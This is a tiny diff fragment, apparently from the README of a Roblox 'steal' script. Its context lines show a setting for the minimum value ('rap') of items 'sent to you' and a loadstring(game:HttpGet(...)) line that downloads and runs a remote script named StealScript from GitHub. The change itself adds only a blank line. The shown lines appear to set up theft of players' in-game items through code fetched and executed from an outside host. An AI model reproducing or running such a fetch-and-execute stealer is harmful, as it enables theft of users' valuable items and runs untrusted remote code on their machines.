@@ -18,6 +18,7 @@ min_rap = 2000000 -- minimum rap of each item you want to get sent to you. 2 mil
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Cezar-Very-Epic/Steal/main/StealScript"))()
 ```
 
+
 .
 
 .
